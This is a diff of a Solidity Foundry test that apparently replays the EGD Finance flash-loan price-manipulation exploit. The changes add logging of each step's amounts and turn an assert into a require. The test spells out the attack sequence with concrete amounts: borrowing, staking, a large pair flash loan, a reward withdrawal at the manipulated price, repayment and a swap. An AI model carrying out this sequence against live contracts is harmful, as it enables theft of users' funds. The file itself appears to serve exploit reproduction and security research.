@@ -219,21 +219,35 @@ contract EGDTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 2100e18);
         borrow_usdt_owner(2100e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 100e18);
         deposit_egdstaking_usdt_egdslp(100e18);
         printBalance("After step1 ");
+        emit log_named_uint("amt2", 424526221219952604636716);
         borrow_usdt_pair(424526221219952604636716);
         printBalance("After step2 ");
+        emit log_named_uint("amt3", 0);
         withdraw_egdstaking_egdslp_egd(0);
         printBalance("After step3 ");
+        emit log_named_uint(
+            "amt4",
+            (uint(424526221219952604636716) * 1003) / 1000
+        );
         payback_usdt_pair((uint(424526221219952604636716) * 1003) / 1000);
         printBalance("After step4 ");
+        emit log_named_uint("amt5", egd.balanceOf(attacker));
+        emit log_named_uint(
+            "amt6",
+            pair.getAmountOut(egd.balanceOf(attacker), address(egd))
+        );
         swap_pair_attacker_egd_usdt(
             egd.balanceOf(attacker),
             pair.getAmountOut(egd.balanceOf(attacker), address(egd))
         );
         printBalance("After step5 ");
+        emit log_named_uint("amt7", (2100e18 * 1003) / 1000);
         payback_usdt_owner((2100e18 * 1003) / 1000);
         printBalance("After step6 ");
         require(attackGoal(), "Attack failed!");
@@ -260,7 +274,7 @@ contract EGDTestBase is Test, BlockLoader {
         payback_usdt_pair(amt4);
         swap_pair_attacker_egd_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
